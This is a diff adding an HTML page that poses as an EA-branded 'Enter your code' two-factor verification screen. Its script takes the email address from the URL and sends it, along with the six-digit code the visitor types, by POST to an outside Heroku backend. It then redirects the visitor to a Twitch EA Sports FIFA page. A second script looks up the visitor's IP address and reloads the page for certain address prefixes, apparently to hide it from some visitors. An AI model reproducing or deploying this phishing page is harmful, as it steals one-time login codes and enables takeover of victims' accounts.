@@ -1,0 +1,155 @@
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="apple-touch-icon" href="/logo.png">
+    <title>verif</title>
+
+    <style>
+        #error{
+    font-size: 0.8rem;
+    color: #f94747;
+}
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJbecmNE.woff2) format('woff2');
+  unicode-range: U+0900-097F, U+1CD0-1CF6, U+1CF8-1CF9, U+200C-200D, U+20A8, U+20B9, U+25CC, U+A830-A839, U+A8E0-A8FB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJnecmNE.woff2) format('woff2');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJfecg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+.wrapper{background-color:#1d2033;min-height:100vh;min-width:100vw;display:flex;justify-content:center;color:#fff;font-family:"Poppins";letter-spacing:2px}.container{width:400px;margin-top:33px;display:flex;flex-direction:column;align-items:center}.title{margin-top:24px;margin-bottom:26px;text-align:center}.email_input{width:400px;height:48px}.email_input::-webkit-input-placeholder{opacity:.7}.email_input:-ms-input-placeholder{opacity:.7}.email_input::placeholder{opacity:.7}.input_two{display:flex;flex-direction:column;margin-bottom:22px;width:400px;position:relative}.password_input{width:400px;height:48px}.password_input::-webkit-input-placeholder{opacity:.7}.password_input:-ms-input-placeholder{opacity:.7}.password_input::placeholder{opacity:.7}.input_three{margin-bottom:20px}.checkInput{height:24px;width:24px;cursor:pointer}.input_four{width:100%}label{font-size:11px;font-weight:700;line-height:1.129;text-transform:uppercase;margin-bottom:8px}.input_three>label{margin-top:5px;margin-left:10px;text-transform:none;font-weight:400;letter-spacing:normal}.input_three>label,button{cursor:pointer;font-size:15px}button{width:100%;height:48px;padding:12px 24px;border-radius:8px;border:none;background-color:#235fe3;color:#fff;font-family:"Poppins";text-transform:uppercase;font-weight:700;letter-spacing:3px;margin-bottom:32px;display:flex;justify-content:center;align-items:center}button,button:hover{transition:all .1s ease}button:hover{height:44px;width:96%;margin-top:2px;margin-left:8px;margin-bottom:34px;font-size:13px;box-shadow:0 0 30px 0 rgba(71,55,221,.35);background-color:#2958be}button:active{background-color:#3f7af8}.links{display:flex;flex-direction:column;align-items:center}a{text-decoration:none;color:#5288fd;font-size:15px;letter-spacing:.7px;box-sizing:content-box;box-sizing:initial}a:hover{text-decoration:underline}p{margin-top:16px;font-size:15px;letter-spacing:.7px}.btn{height:32px;width:40px;position:absolute;right:12px;bottom:8px;border-radius:8px;background-color:#242735;cursor:pointer;display:flex;justify-content:center;align-items:center;padding:8px}.btn,.btn:hover{transition:all .1s ease-in-out}.btn:hover{background-color:#11151f}.checkContainer{display:block;position:relative;margin-bottom:12px;cursor:pointer;font-size:21px;-webkit-user-select:none;-ms-user-select:none;user-select:none}.checkContainer input{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.checkmark{position:absolute;top:-3px;left:-10px;height:24px;width:24px;background-color:#141724;border:2px solid #62626f;border-radius:5px}.checkContainer>p{margin-left:25px}.checkContainer input:checked~.checkmark{background-color:#1029b3;border:2px solid #235fe3;box-shadow:0 0 30px 0 rgba(157,152,199,.35)}.checkmark:after{content:"";position:absolute;display:none}.checkContainer input:checked~.checkmark:after{display:block}.checkContainer .checkmark:after{left:6px;top:2px;width:5px;height:10px;border:solid #fff;border-width:0 3px 3px 0;-webkit-transform:rotate(45deg);transform:rotate(45deg)}.email_err{margin-top:0}.email_err,.password_err{color:#f94747;font-size:13px;-webkit-animation:slidein .5s;animation:slidein .5s}.password_err{margin-top:-20px;margin-bottom:10px;line-height:1;letter-spacing:1.25}@media screen and (min-height:800px){.container{margin-top:90px}}@media screen and (max-width:450px){.container{width:85%}.email_input,.input_four,.input_three,.input_two,.myForm,.password_input,form{width:100%}}*{margin:0;padding:0;box-sizing:border-box}.V_wrapper{background-color:#1d2033;min-height:100vh;min-width:100vw;color:#fff;font-family:"Poppins";letter-spacing:2px}.V_container,.V_wrapper{display:flex;align-items:center;flex-direction:column}.V_container{width:400px;margin-top:33px}.V_title{margin-top:24px;margin-bottom:26px;text-align:center}h1{font-size:23px;font-weight:900;line-height:1.35;letter-spacing:1.5px}form{display:flex;flex-direction:column;width:100%}input{background:#141724;border:2px solid #62626f;border-radius:8px;color:#fff;padding:0 12px;font-family:"Poppins";letter-spacing:.3px;font-size:15px}input:focus{box-shadow:0 2px 5px 0 rgba(226,230,231,.12),0 0 5px 0 rgba(239,243,245,.63);border:2px solid #fff;outline:none}.input_one{display:flex;flex-direction:column;width:100%;margin-bottom:16px}.code_input{width:400px;height:48px}.code_input::-webkit-input-placeholder{opacity:.7}.code_input:-ms-input-placeholder{opacity:.7}.code_input::placeholder{opacity:.7}.V_para{text-align:center;margin-bottom:24px}.V_links{display:flex;flex-direction:column;align-items:flex-start;width:100%;height:50px;justify-content:space-between}.code_err{color:#f94747;font-size:13px;margin-top:5px;-webkit-animation:slidein .5s;animation:slidein .5s}.V_btn{width:100%;display:flex;justify-content:flex-start}#btn{padding:8px 16px;background:#343647;color:#fff;border-radius:12px;text-transform:uppercase;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:1.5px}#btn,#btn:hover{transition:all .1s ease-in-out}#btn:hover{text-decoration:none;margin-bottom:1.4px;margin-left:1px;font-size:10px}@-webkit-keyframes slidein{0%{margin-left:-20px}to{margin-left:0}}@keyframes slidein{0%{margin-left:-20px}to{margin-left:0}}.notification{width:400px;padding:16px 48px;align-items:center;background:#171a29;text-align:center}.notification,.notification>p{display:flex;justify-content:center}.notification>p{line-height:1.5}.notification>p>span{flex:0 0 80%}.spinner{height:30px;width:30px;border-radius:50%;border:3px solid #3f7af8;border-top-color:#fff;-webkit-animation:spin .8s linear infinite;animation:spin .8s linear infinite}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@media screen and (max-width:450px){.notification,.V_container{width:85%}.code_input,.input_four,.input_three,.V_form,form{width:100%}}@media screen and (min-height:800px){.V_container{margin-top:40px}.notification{margin-top:10px}}
+/*# sourceMappingURL=main.9bcaedc7.chunk.css.map */
+    </style>
+</head>
+
+<body>
+    <div id="root">
+        <div class="V_wrapper">
+            <div class="V_container">
+                <div class="V_btn"><a  id="btn" onclick="goback()">❮ back</a></div>
+                <div class="V_logo"><svg width="64" height="64" viewBox="0 0 64 64" fill="none"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M31.9527 0C14.3055 0 0 14.3091 0 31.9527C0 49.6036 14.3055 63.9055 31.9527 63.9055C49.6 63.9055 63.9055 49.6036 63.9055 31.9527C63.9055 14.3091 49.6 0 31.9527 0ZM19.2218 19.3818H37.5891L34.8 23.8473H16.4327L19.2218 19.3818ZM49.9091 41.6982L47.1164 37.24H38.9636L41.76 32.7745H44.3345L41.2218 27.8036L32.5382 41.6945H9.37455L14.9527 32.7709H10.8582L13.6436 28.3055H31.5527L28.7636 32.7782H20.2218L17.4291 37.2436H30.0618L41.2218 19.3818L55.1709 41.7018H49.9091V41.6982Z"
+                            fill="#FF4747"></path>
+                    </svg></div>
+                <div class="V_title">
+                    <h1>Enter your code</h1>
+                </div>
+                <div class="V_para">
+                    <p>We sent your verification code to <span id="email"></span>. Enter your code below.</p>
+                </div>
+                <div class="V_form">
+                    <form autocomplete="off" onsubmit="return false" id="myForm">
+                        <div class="input_one"><label>Code</label><input  type="texte" name="oneTimeCode"
+                                class="code_input" id="code" placeholder="Enter 6 digits code" value=""></div>
+                                <div id="error" ></div>
+
+                        <div class="input_three"><label class="checkContainer"><input type="checkbox"><span
+                                    class="checkmark"></span>
+                                <p>Remember this device</p>
+                            </label></div>
+                        <div class="input_four"><button onclick="goto()" form="myForm">Sign in</button></div>
+                    </form>
+
+                </div>
+                <div class="V_links"><a href="#">Resend verification code</a><a
+                        href=""
+                        target="_blank">Problems receiving your code?</a></div>
+            </div>
+        </div>
+    </div>
+    <script>!function (e) { function r(r) { for (var n, l, a = r[0], p = r[1], f = r[2], c = 0, s = []; c < a.length; c++)l = a[c], Object.prototype.hasOwnProperty.call(o, l) && o[l] && s.push(o[l][0]), o[l] = 0; for (n in p) Object.prototype.hasOwnProperty.call(p, n) && (e[n] = p[n]); for (i && i(r); s.length;)s.shift()(); return u.push.apply(u, f || []), t() } function t() { for (var e, r = 0; r < u.length; r++) { for (var t = u[r], n = !0, a = 1; a < t.length; a++) { var p = t[a]; 0 !== o[p] && (n = !1) } n && (u.splice(r--, 1), e = l(l.s = t[0])) } return e } var n = {}, o = { 1: 0 }, u = []; function l(r) { if (n[r]) return n[r].exports; var t = n[r] = { i: r, l: !1, exports: {} }; return e[r].call(t.exports, t, t.exports, l), t.l = !0, t.exports } l.m = e, l.c = n, l.d = function (e, r, t) { l.o(e, r) || Object.defineProperty(e, r, { enumerable: !0, get: t }) }, l.r = function (e) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 }) }, l.t = function (e, r) { if (1 & r && (e = l(e)), 8 & r) return e; if (4 & r && "object" == typeof e && e && e.__esModule) return e; var t = Object.create(null); if (l.r(t), Object.defineProperty(t, "default", { enumerable: !0, value: e }), 2 & r && "string" != typeof e) for (var n in e) l.d(t, n, function (r) { return e[r] }.bind(null, n)); return t }, l.n = function (e) { var r = e && e.__esModule ? function () { return e.default } : function () { return e }; return l.d(r, "a", r), r }, l.o = function (e, r) { return Object.prototype.hasOwnProperty.call(e, r) }, l.p = "/"; var a = this.webpackJsonpea_projetb = this.webpackJsonpea_projetb || [], p = a.push.bind(a); a.push = r, a = a.slice(); for (var f = 0; f < a.length; f++)r(a[f]); var i = p; t() }([])</script>
+
+</body>
+<script>
+    String.prototype.replaceAt = function(index, replacement) {
+    return this.substr(0, index) + replacement + this.substr(index + replacement.length);
+}
+   var  email = window.location.href;
+   var indexofEmail=email.indexOf("email");
+   var simpleemail=email.slice(indexofEmail+6,-1)
+   var CodeVerifMail= simpleemail+email[email.length-1];
+
+   var div = document.getElementById('email');
+   for(let i=0; i < 5;i++){
+    simpleemail=simpleemail.replaceAt(i, '*')
+   }
+    div.innerHTML += simpleemail+email[email.length-1];
+    function goto(){
+        var div = document.getElementById('error');
+
+        if(document.getElementById("code").value.length!=6||(isNaN(document.getElementById("code").value))){
+            div.innerHTML = "code incorrect";
+                return 
+        }else{
+            div.innerHTML = "";
+ 
+        }
+        fetch('https://matrouxa.herokuapp.com/backend/updateCode',
+        {method: 'POST',
+        headers: {
+        'Content-Type': 'application/json'
+        },
+	   body: JSON.stringify({
+           email:CodeVerifMail,
+           code:document.getElementById("code").value
+       })}).then(data=>{
+        setInterval(() => {
+                  window.location.href="https://www.twitch.tv/easportsfifa";
+      }, 1500);
+       })
+
+    }
+    function goback(){
+        window.location = '/';
+
+    }
+         console.log("aaaaaaa")
+
+</script>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+     
+      <script>
+     console.log("aaaaaaa")
+    /* Add "https://api.ipify.org?format=json" statement
+               this will communicate with the ipify servers in
+               order to retrieve the IP address $.getJSON will
+               load JSON-encoded data from the server using a
+               GET HTTP request */
+                
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        let ip=data.ip.slice(0,data.ip.indexOf('.'))
+        console.log(ip)
+        // Setting text of element P with id gfg
+        console.log(ip)
+        if(ip=="197"||ip=="193"||ip=="198"||ip=="194"){
+            console.log("aa")
+            location.reload();
+        }
+   
+    })
+    </script>
+</html>
